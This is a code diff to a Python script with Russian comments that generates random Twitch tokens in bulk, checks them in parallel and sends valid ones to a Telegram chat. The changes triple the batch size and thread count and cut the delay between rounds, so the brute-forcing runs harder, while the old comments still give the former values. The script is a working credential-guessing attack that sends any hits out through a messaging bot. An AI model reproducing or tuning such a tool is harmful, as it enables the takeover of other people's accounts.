@@ -39,7 +39,7 @@ def main():
     
     while True:
         # Генерируем токены
-        tokens = [generate_token() for _ in range(50)]  # Генерируем 50 токенов
+        tokens = [generate_token() for _ in range(150)]  # Генерируем 50 токенов
         print("Generated tokens:")
         for token in tokens:
             print(token)
@@ -49,7 +49,7 @@ def main():
         
         # Проверяем токены
         print("\nChecking tokens:")
-        with ThreadPoolExecutor(max_workers=50) as executor:
+        with ThreadPoolExecutor(max_workers=150) as executor:
             future_to_token = {executor.submit(check_twitch_token, token): token for token in tokens}
             for future in as_completed(future_to_token):
                 token, is_valid = future.result()
@@ -62,17 +62,17 @@ def main():
         # Отправляем валидные токены
         if valid_tokens:
             for token in valid_tokens:
-                message = f"Valid token found: {token}"
+                message = f"#Valid token found: {token}"
                 print(message)
                 send_telegram_message(bot, CHAT_ID, message)
         else:
             if invalid_token:
-                message = f"All tokens are invalid. Example of an invalid token: {invalid_token}"
+                message = f"#Invalid All tokens are #invalid. Example of an invalid token: {invalid_token}"
                 print(message)
                 send_telegram_message(bot, CHAT_ID, message)
 
         # Пауза перед следующей итерацией
-        time.sleep(10)  # Задержка 10 секунд (можете настроить по своему усмотрению)
+        time.sleep(3)  # Задержка 10 секунд (можете настроить по своему усмотрению)
 
 if __name__ == '__main__':
     main()
